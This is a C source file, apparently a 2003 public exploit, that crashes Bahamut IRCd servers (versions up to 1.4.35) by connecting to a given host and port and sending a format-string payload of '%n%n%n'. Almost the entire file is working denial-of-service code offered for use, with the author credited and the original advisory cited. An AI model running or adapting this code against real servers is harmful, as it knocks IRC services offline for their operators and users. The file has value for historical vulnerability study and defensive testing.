/*
 * Irc crash for bahamut servers based on http://www.securityfocus.com/archive/1/326917/2003-06-24/2003-06-30/0
 * Bahamut IRCd <= 1.4.35
 * - Dinos nagash@compulink.gr 27/06/03
 */

#include <stdio.h>              /* for printf() */
#include <sys/socket.h>         /* for socket(), connect(), send() and recv() */
#include <arpa/inet.h>          /* for sockaddr_in inet_addr() */
#include <stdlib.h>             /* for atoi() */
#include <unistd.h>             /* for close() */
#include <fcntl.h>              /* for fcntl() */
#include <sys/file.h>           /* for O_NONBLOCK and FASYNC */
#include <sys/time.h>           /* for timeval */
#include <errno.h>              /* for errno and EINPROGRESS */
#include <netdb.h>              /* for gethostbyname */

unsigned long resolv_name(char name[])
{
   struct hostent   *host;              /* structure containing host information */

   if ( (host = gethostbyname(name)) == NULL )
   {
        printf("gethostbyname() failed\n");
        exit(1);
   }
   /* returing the binary, network-byte-ordered address */
   return *( (unsigned long *) host->h_addr_list[0] );
}


int main (int argc, char *argv[])
{
   int sock;                    /* socket descriptor */
   int retval;                  /* return value from connect() */
   struct sockaddr_in ServAddr; /* socks's server address */
   char *servIP;                /* server IP address */
   char *socksbuf;              /* send buffer */
   unsigned short ServPort;     /* socks server port */
   struct timeval tv;           /* timeout values */
   unsigned int len;            /* message length */
   fd_set sockSet;              /* set of socket description */
   unsigned long theip;         /* the ip */
   fd_set setit;                /* fd settings for select() */
   int i;

   if ( argc < 2 )
   {
        printf("Irc Crash \n");
        printf("Usage:");
        printf("./ircc <irc-server> <port>\n");
        exit(1);
   }

   servIP = argv[1];
   ServPort = atoi(argv[2]);

   if ( ( sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ) < 0 )
        return -1;      /* There is no socket for us :( */

   memset(&ServAddr, 0, sizeof(ServAddr));
   ServAddr.sin_family          = AF_INET;
   ServAddr.sin_addr.s_addr     = resolv_name(servIP);  /* irc-server ip */
   ServAddr.sin_port            = htons(ServPort);      /* port */


   if ( connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) == 0 ) {
        printf("Connected...\n");
   }
   else {
        printf("Error connecting to the ircserver\n");
        close(sock);
        exit(1);
   }
   sleep(1); /* just sleep */
   memset(&socksbuf, 0, sizeof(socksbuf));
   socksbuf = "%n%n%n";
   printf("Sending buffer %s\n",socksbuf);
   i = send(sock, socksbuf, 7, 0);
   if (i <0) {
        printf ("Error sending buffer\n");
        close(sock);
        return -1;
   }

   printf("Buffer send\n");

   close(sock);
   return 0;
}
